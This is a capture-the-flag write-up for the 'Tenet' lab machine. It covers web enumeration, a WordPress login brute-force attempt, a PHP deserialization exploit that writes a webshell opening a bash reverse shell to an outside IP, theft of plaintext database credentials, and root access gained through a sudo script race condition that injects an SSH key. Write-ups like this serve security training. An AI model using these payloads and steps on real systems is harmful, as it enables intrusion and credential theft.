# Tenet

export IP=10.10.10.223

# Solution

Lets start with the traditional nmap scan
```
cmd: nmap -sC -sV -oN nmap/initial -vvv $IP

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo=
|   256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

While we check the webserver lets do an all ports scan in the background <br>

Theres not really much there, just the default apache server, lets fuzz the webserver on port 80<br>

```
cmd: gobuster dir -u http://$IP -w /opt/SecLists/Discovery/Web-Content/big.txt -x php,txt,html,js -t 80 -o gobuster/big.log

/index.html (Status: 200)       <- the apache "It works" page
/users.txt (Status: 200)        <- Just responds "success" without anything else special in the request/response
/wordpress (Status: 301)        <- A page with multiple things
```

In the /wordpress location we can see that exists a link to the **tenet.htb** domain, lets add to the **/etc/hosts** <br> 

**UPDATE:** the all port scan did not found anything else more <br>

After adding the domain to the /etc/hosts, now the webserver has a UI (the assets were referenced from this domain) so now lets do another fuzzing just to make sure <br>

Found something 
```
/index.php (Status: 301)
/license.txt (Status: 200)
/readme.html (Status: 200)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-config.php (Status: 200)
/wp-includes (Status: 301)
/wp-login.php (Status: 200)
/wp-trackback.php (Status: 200)
```

Analyzing the page we can see several posts 
```
Posted by: protagonist
Title: This is Where our worlds collide
Content:

We’re looking for beta testers of our new time-management software, ‘Rotas’ (...)
```

Seems that they are implementing something new (probably misconfigured at this point). Also, we got a user: **protagonist**<br>

```
Posted by: protagonist
Title: Migration
Content: We’re moving our data over from a flat file structure to something a bit more substantial. (....)
```
The post itself has nothing really interesting, but it has comment which is very interesting 
```
Posted by: neil
Content: did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
```

Hummmmmmm, another user and potential accessible interesting files!! lets shift to the wordpress and remind this for later but just check that **/readme.html** before <br>

Note: i checked sator.php (aswell as rotas.php, which is that reversed) and also if there was a file for that with **.bak** extension, but it does not. Maye a fuzz for .bak would find something, but lets save that for later, maybe we can get access without it <br>

Checking the **tenet.htb/readme.html** we can see the wordpress initial process of installation and configuration... lets test if they changed/setted the admin password <br>

Yup, they did, since **tenet.htb/wp-login.php** already requests password (and not a configuration "wizard" is shown). <br>

We can check quick things right away
```
From source code:   Version 5.6
admin:admin         <- Unknown Username.....
protagonist:admin   <- Error: The password you entered for the username protagonist is incorrect
neil:admin          <- Error: The password you entered for the username neil is incorrect
```

Alright, we have the confirmation that these users exist due to the error message !! <br>

Before we try to brute force this login, lets run a wp-scan on it <br> 

It did not found anything worthwhile.. <br>

Also, did not found any vulnerability for the WP (version 5.6) neither for the theme (twentytentyone) <br>

Lets so bruteforce this wp login ! I'll use the **WPForce** tool since it brute forces through the API and not the login form wich is faster and bypasses some protections <br>

```
cmd: python2 /opt/WPForce/wpforce.py -i usernames -w /opt/SecLists/Passwords/Leaked-Databases/rockyou-75.txt -u "http://tenet.htb/"

No results !
```

Well, the last thing available to try is the **sator.php** and the bak (for the same file) mentioning! <br>

When i tested to check if the page existed, i only tested in **tenet.htb** and not in the IP (the apache server) ! <br>

``` 
cmd: curl http://$IP/sator.php

[+] Grabbing users from text file <br>
[] Database updated <br>%
```

We saw early that **/users.txt** file (from the enumeration), might be associated to this page ! <br>

Before messing with that, i'll try the **.bak** too <br>

```
cmd: curl http://$IP/sator.php.bak

<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
	        echo '[+] Grabbing users from text file <br>';
	        $this-> data = 'Success';
	}


	public function __destruct()
	{
	        file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
	        echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

The code confirms the association between this and the **users.txt** file, because it just writes **Success** to it ($this->data) and thats all the file actually has. <br>

The only thing i can see that is prone to exploitation is the **unserialize($input)** function usage without treating the data and having a magic method (in this case, **__destruct()**)<br> 

To exploit it, we need to create a local file (i named **exp.php**, and is in the folder of this notes) and create a class with the following structure
```
class DatabaseExport {
    public $user_file;
    public $data;
}
```

Then, we need to create an object of it, assign what we want to **\$user_file** and **\$data**, serialize and urlencode it ! <br>

```
$o = new DatabaseExport();
$o->user_file = 'waza.php';
$o->data = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.16.14/1414 0>&1\'"); ?>'; 

$payload = urlencode(serialize($o));

echo $payload;
```

What happens is that, when it is unserialized it "poisons" the object **\$databaseupdate** and when the thread in charge of processing my requeste is about to end, it needs to destruct all the objects so when it destructs the object with the malicious input, it calls the file_put_contents and uses the data that as unserialized <br>

The payload generated is
```
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22waza.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.16.14%2F1414+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D%
```

Making the request
```
cmd: curl -X GET "http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22waza.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.16.14%2F1414+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D%" && curl "http://10.10.10.223/waza.php"
```

Voila !

```
cmd: whoami && id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

My shell is all messed up, lets search for the user creds (and then ssh in) ! I started by checking the DB connection and it has some creds hardcoded in the **wp-config.php**
``` 
cmd: cat wp-config.php | grep DB

define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'neil' );
define( 'DB_PASSWORD', 'Opera2112' );
```

And it worked !! <br>

```
cmd: su neil
Password: Opera2112

cmd: whoami && id

neil
uid=1001(neil) gid=1001(neil) groups=1001(neil)

cat ~/user.txt
FLAG: 8b5c6531052b3f3f7ed8e69335588f8a
```

Running linpeas found some interesting things
```
sudo 1.8.21p2

mysql (127.0.0.1:36 LISTEN)

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

After checking the mentioned things we finally get to the **/usr/local/bin/enableSSH.sh** <br> 

Note: will not include the script in the notes, but is in the note's folder <br>

Since we can use **SUDO** to run this script, we can leverage it to get root access, but how? <br>

The script has a race condition in the following lines

```
(...)
checkFile $tmpName

/bin/cat $tmpName >>/root/.ssh/authorized_keys

(...)
```

It checks the file (although the result does not generate a break if fails) and then adds the content of the file to the root's authorized keys <br>

If we have luck and change the file in this time inbetween we can inject neil's (or our local one) ssh public key and then ssh to root with his (or our) private one <br>

Creating this script
```
#!/bin/bash

while true; do
    echo $key | tee /tmp/ssh-* > /dev/null
done
```

Then execute the other script (with sudo) a couple of times
``` 
cmd: sudo /usr/local/bin/enableSSH.sh
```

Try to ssh with the corresponding (to the public one inject) private key
```  
cmd ssh -i id_rsa root@$IP

cmd: whoami && id
root
uid=0(root) gid=0(root) groups=0(root)

FLAG:3e89a83bf67e992044262f3beec9afb2
```

Note: It might take a while to get the key injected. Depends on the ammount of users and in a bit of luck. <br>
Note2: if it echo's "Error in adding root@ubuntu to authorized_keys file!", it might be a good indicator that the file is being written while checking, just try to ssh before issueing the sudo command again ! 